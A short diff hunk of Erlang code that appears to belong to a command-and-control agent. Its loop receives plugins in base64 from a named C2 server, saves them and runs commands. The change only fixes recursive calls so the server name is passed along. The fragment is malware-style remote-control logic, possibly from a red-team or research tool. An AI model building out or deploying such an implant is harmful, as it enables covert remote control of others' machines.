@@ -44,13 +44,13 @@ loop(C2ServerName) ->
 	{plugin,PluginName,PluginContentBase64} -> 
 	    io:format("GOT PLUGIN~n"),
 	    run_commands([savePlugin(PluginName, PluginContentBase64)]),
-	    loop()
+	    loop(C2ServerName)
     after 10 ->
-	    loop()
+	    loop(C2ServerName)
     end,
     receive
     after 10 ->
-	    loop()
+	    loop(C2ServerName)
     end.
 				     
 start(C2ServerName) ->
